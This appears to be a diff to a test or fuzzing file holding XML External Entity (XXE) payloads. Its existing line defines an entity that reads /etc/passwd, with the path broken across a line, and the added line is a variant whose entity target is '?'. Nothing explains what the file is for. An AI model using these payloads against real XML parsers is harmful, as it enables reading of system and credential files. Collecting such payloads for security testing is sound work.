@@ -1,2 +1,4 @@
  <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "/etc/-
 passwd">]><config><location>&xxe;</location></config>
+
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "?">]><config><location>&xxe;</location></config>
